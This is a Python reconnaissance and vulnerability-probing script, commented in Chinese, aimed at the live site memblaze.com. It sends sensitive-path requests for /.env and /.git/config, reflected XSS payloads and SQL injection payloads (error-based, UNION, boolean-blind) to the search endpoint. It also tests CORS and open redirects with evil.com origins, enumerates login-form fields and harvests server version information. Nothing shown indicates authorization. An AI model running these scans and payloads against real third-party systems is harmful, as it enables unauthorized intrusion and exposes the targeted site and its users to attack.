"""深入侦察 - memblaze.com 真实端点"""
import requests
import urllib3
import re
import time
from secops_core.config import HTTP_USER_AGENT

urllib3.disable_warnings()
headers = {"User-Agent": HTTP_USER_AGENT}
BASE = "https://www.memblaze.com"

# 1. 验证 catch-all 路由行为
print("=== Catch-all 路由验证 ===")
real_pages = {}
test_paths = ["/admin", "/.env", "/.git/config", "/phpinfo.php", "/nonexist12345"]
for p in test_paths:
    try:
        r = requests.get(f"{BASE}{p}", headers=headers, timeout=10, verify=False)
        size = len(r.content)
        title_match = re.search(r'<title>(.*?)</title>', r.text, re.IGNORECASE)
        title = title_match.group(1) if title_match else "N/A"
        print(f"  {p}: {r.status_code}, {size} bytes, title={title}")
        if r.status_code == 200 and size != 60336:
            real_pages[p] = {"size": size, "title": title}
    except Exception as e:
        print(f"  {p}: {e}")

# 2. 测试搜索功能 - XSS
print("\n=== 搜索功能测试 (/search/list) ===")
xss_payloads = [
    '"><secopsxss>',
    "<secopsxss>",
    '"><img src=x onerror=alert(1)>',
    "<svg/onload=alert(1)>",
    "'-alert(1)-'",
]
for payload in xss_payloads:
    try:
        r = requests.get(f"{BASE}/search/list", params={"keyword": payload},
                        headers=headers, timeout=10, verify=False)
        if payload in r.text:
            print(f"  [!] XSS REFLECTED: payload完整出现在响应中")
            print(f"      Payload: {payload}")
            print(f"      Size: {len(r.content)} bytes")
        elif "secopsxss" in r.text:
            tag = re.search(r'<secopsxss[^>]*>', r.text)
            print(f"  [!] XSS TAG PARSED: {tag.group() if tag else 'found'}")
        else:
            # 检查是否被转义
            escaped = payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
            if escaped in r.text:
                print(f"  [OK] 已转义: {payload[:40]}")
            else:
                print(f"  [-] 未反射: {payload[:40]}")
        time.sleep(0.3)
    except Exception as e:
        print(f"  Error: {e}")

# 3. 测试搜索功能 - SQLi
print("\n=== 搜索功能 SQL 注入测试 ===")
sqli_payloads = [
    ("'", "MySQL/PG error"),
    ("\"'", "MySQL/PG error"),
    ("1' ORDER BY 100--", "ORDER BY"),
    ("1 UNION SELECT NULL--", "UNION"),
    ("' AND 1=CONVERT(int, (SELECT @@version))--", "MSSQL"),
]
error_patterns = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"valid MySQL result",
    r"PostgreSQL.*ERROR", r"Warning.*\Wpg_", r"ORA-[0-9]{4}",
    r"Driver.* SQL", r"OLE DB.* SQL Server", r"SQLite.*Exception",
    r"\[SQLITE_ERROR\]", r"SQLSTATE\[", r"You have an error in your SQL",
    r"Unclosed quotation mark", r"syntax error at or near",
]
for payload, desc in sqli_payloads:
    try:
        r = requests.get(f"{BASE}/search/list", params={"keyword": payload},
                        headers=headers, timeout=10, verify=False)
        found_error = False
        for pattern in error_patterns:
            if re.search(pattern, r.text, re.IGNORECASE):
                found_error = True
                match = re.search(pattern, r.text, re.IGNORECASE)
                print(f"  [!] SQLi ERROR: {match.group()[:100]}")
                break
        if not found_error:
            print(f"  [-] 无报错: {desc}")
        time.sleep(0.3)
    except Exception as e:
        print(f"  Error: {e}")

# 4. 布尔盲注测试
print("\n=== 布尔盲注测试 ===")
try:
    r_true = requests.get(f"{BASE}/search/list", params={"keyword": "1 AND 1=1"},
                         headers=headers, timeout=10, verify=False)
    r_false = requests.get(f"{BASE}/search/list", params={"keyword": "1 AND 1=2"},
                          headers=headers, timeout=10, verify=False)
    diff = abs(len(r_true.content) - len(r_false.content))
    print(f"  True response: {len(r_true.content)} bytes")
    print(f"  False response: {len(r_false.content)} bytes")
    print(f"  Difference: {diff} bytes")
    if diff > 50:
        print(f"  [!] 可能存在布尔盲注!")
    else:
        print(f"  [-] 响应差异不大")
except Exception as e:
    print(f"  Error: {e}")

# 5. CORS 测试 (详细)
print("\n=== CORS 详细测试 ===")
cors_origins = [
    "https://evil.com",
    "https://www.memblaze.com.evil.com",
    "null",
    "https://attacker.com",
]
for origin in cors_origins:
    try:
        h = headers.copy()
        h["Origin"] = origin
        r = requests.get(f"{BASE}/cn/", headers=h, timeout=10, verify=False)
        acao = r.headers.get("Access-Control-Allow-Origin", "N/A")
        acac = r.headers.get("Access-Control-Allow-Credentials", "N/A")
        if acao != "N/A":
            print(f"  Origin: {origin}")
            print(f"    ACAO: {acao}")
            print(f"    ACAC: {acac}")
            if acao == "*" or origin in acao:
                print(f"    [!] CORS 可被利用!")
        else:
            print(f"  Origin: {origin} -> 无 CORS 头")
    except Exception as e:
        print(f"  Error: {e}")

# 6. /auth/login 页面分析
print("\n=== /auth/login 页面分析 ===")
try:
    r = requests.get(f"{BASE}/auth/login", headers=headers, timeout=10, verify=False)
    print(f"  Status: {r.status_code}, Size: {len(r.content)} bytes")
    forms = re.findall(r'<form[^>]*>', r.text, re.IGNORECASE)
    inputs = re.findall(r'<input[^>]*>', r.text, re.IGNORECASE)
    print(f"  Forms: {len(forms)}")
    for f in forms:
        print(f"    {f[:200]}")
    print(f"  Inputs: {len(inputs)}")
    for inp in inputs:
        name = re.search(r'name=["\']([^"\']*)["\']', inp)
        typ = re.search(r'type=["\']([^"\']*)["\']', inp)
        if name:
            print(f"    name={name.group(1)}, type={typ.group(1) if typ else 'text'}")
except Exception as e:
    print(f"  Error: {e}")

# 7. /support/download 页面分析
print("\n=== /support/download 页面分析 ===")
try:
    r = requests.get(f"{BASE}/support/download", headers=headers, timeout=10, verify=False)
    print(f"  Status: {r.status_code}, Size: {len(r.content)} bytes")
    links = re.findall(r'href=["\']([^"\']*\.(zip|pdf|exe|msi|rar|7z|doc|xls|csv))["\']', r.text, re.IGNORECASE)
    print(f"  Download links: {len(links)}")
    for link, ext in links[:10]:
        print(f"    {link}")
except Exception as e:
    print(f"  Error: {e}")

# 8. 信息泄露 - HTTP 响应头详细
print("\n=== 详细响应头 ===")
try:
    r = requests.get(f"{BASE}/cn/", headers=headers, timeout=10, verify=False)
    for k, v in r.headers.items():
        print(f"  {k}: {v}")
except Exception as e:
    print(f"  Error: {e}")

# 9. 开放重定向测试 (针对真实页面)
print("\n=== 开放重定向测试 ===")
redirect_params = ["redirect", "url", "next", "return", "goto", "dest", "target"]
for param in redirect_params:
    try:
        r = requests.get(f"{BASE}/cn/", params={param: "https://evil.com"},
                        headers=headers, timeout=8, verify=False, allow_redirects=False)
        loc = r.headers.get("Location", "")
        if "evil.com" in loc:
            print(f"  [!] Open Redirect via {param}: {loc}")
        elif r.status_code in (301, 302, 303, 307, 308):
            print(f"  Redirect {r.status_code} via {param}: {loc}")
    except Exception:
        pass

# 10. 检查 PHP 版本信息
print("\n=== PHP/框架版本信息 ===")
try:
    r = requests.get(f"{BASE}/cn/", headers=headers, timeout=10, verify=False)
    # Check for version info in headers
    powered = r.headers.get("X-Powered-By", "")
    if powered:
        print(f"  X-Powered-By: {powered}")
    # Check for generator meta tag
    gen = re.search(r'<meta[^>]*name=["\']generator["\'][^>]*content=["\']([^"\']*)["\']', r.text, re.IGNORECASE)
    if gen:
        print(f"  Generator: {gen.group(1)}")
    # Check for version strings in HTML
    versions = re.findall(r'(?:version|ver|v)[\s:=]+[\d.]+', r.text, re.IGNORECASE)
    for v in versions[:5]:
        print(f"  Version string: {v}")
except Exception as e:
    print(f"  Error: {e}")
